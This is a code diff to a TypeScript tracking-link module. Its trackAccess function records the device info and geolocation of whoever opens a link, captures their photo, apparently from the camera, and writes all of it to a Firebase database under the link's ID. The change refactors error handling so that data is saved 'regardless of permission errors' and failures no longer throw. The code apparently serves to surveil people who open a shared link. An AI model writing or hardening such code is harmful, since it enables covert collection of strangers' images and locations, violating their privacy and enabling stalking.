@@ -107,15 +107,16 @@ export const getLocation = async (): Promise<{ location?: TrackingData['location
   }
 };
 
-export const trackAccess = async (linkId: string) => {
+export const trackAccess = async (linkId: string): Promise<TrackingData> => {
+  // Initialize tracking data with timestamp and device info
+  const trackingData: TrackingData = {
+    timestamp: Date.now(),
+    device: getDeviceInfo(),
+    errors: {}
+  };
+
   try {
-    const trackingData: TrackingData = {
-      timestamp: Date.now(),
-      device: getDeviceInfo(),
-      errors: {}
-    };
-    
-    // Get location
+    // Get location - continue even if it fails
     const locationResult = await getLocation();
     if (locationResult.location) {
       trackingData.location = locationResult.location;
@@ -123,7 +124,7 @@ export const trackAccess = async (linkId: string) => {
       trackingData.errors.location = locationResult.error;
     }
     
-    // Capture photo
+    // Capture photo - continue even if it fails
     const photoResult = await capturePhoto();
     if (photoResult.photo) {
       trackingData.photo = photoResult.photo;
@@ -131,13 +132,18 @@ export const trackAccess = async (linkId: string) => {
       trackingData.errors.photo = photoResult.error;
     }
     
-    // Save to Firebase
+    // Save to Firebase regardless of permission errors
     const accessRef = ref(database, `accesses/${linkId}/${Date.now()}`);
     await set(accessRef, trackingData);
     
     return trackingData;
   } catch (error) {
-    console.error('Error tracking access:', error);
-    throw error;
+    // If Firebase save fails, add it to errors but don't throw
+    console.error('Error saving tracking data:', error);
+    trackingData.errors = {
+      ...trackingData.errors,
+      save: 'Failed to save tracking data'
+    };
+    return trackingData;
   }
-};
+}
